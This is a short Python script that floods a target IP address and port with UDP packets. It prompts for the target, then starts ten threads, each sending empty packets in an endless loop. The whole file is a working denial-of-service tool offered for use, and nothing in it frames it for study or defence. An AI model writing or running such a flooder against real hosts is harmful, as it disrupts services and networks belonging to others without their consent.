import threading
import socket

num_threads = 10

def send_udp_request(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'', (target_ip, target_port))
            print(f"UDP packet sent to {target_ip}:{target_port}!")
        except socket.error:
            pass

def get_target():
    while True:
        target_ip = input("Enter the target IP address (e.g., 192.168.0.1): ")
        try:
            socket.inet_aton(target_ip)  # Check if IP address is valid
            target_port = int(input("Enter the target port: "))
            return target_ip, target_port
        except (socket.error, ValueError):
            print("Invalid IP address or port. Please try again.")

# Get the target IP and port from user input
target_ip, target_port = get_target()

# Spawn multiple threads to send UDP packets simultaneously
for _ in range(num_threads):
    thread = threading.Thread(target=send_udp_request, args=(target_ip, target_port))
    thread.start()
